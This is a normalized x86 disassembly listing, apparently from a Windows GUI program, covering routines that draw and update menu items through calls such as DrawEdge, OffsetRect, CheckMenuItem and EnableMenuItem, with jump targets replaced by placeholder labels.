call OffsetRect
sub_45b470
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45bd78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4240b4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_423c94
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4234a8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043b0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_423c94
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4240b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457704
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424598
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423c8c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423c94
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423c94
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4240b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423c8c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42affc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423c68
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4240b4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4240b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45b8bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_429f00
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4234a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457704
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423c94
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45a918
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423774
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424598
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424288
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457c1c
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424598
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_423f8c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4234a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403254
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45a918
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bd7f
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_4599dc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_4243d4
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_45a918
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45becc
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_45c8b0
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_45befc
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_45bf48
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45c12a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403450
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_45befc
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_45c8b0
mov esi eax
mov eax edi
call sub_45becc
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4043b0
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c68
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_40403c
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_4599dc
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4042b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c131
lea eax [ ebp - 0x24 ]
call sub_403fa4
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_45a918
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_45c15c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4043b0
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403ff8
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45c184
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45c2f4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_45c304
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45c1cc
sub_45c1cc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45a888
push eax
call CheckMenuItem
mov eax esi
call sub_45c184
sub_45c220
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_45c2f4
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45a888
push eax
call EnableMenuItem
sub_45c298
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_45c658
mov edx eax
mov ecx ebx
mov eax edi
call sub_45a828
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_45c184
sub_45c304
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a5d0
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_459930
sub_45c374
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
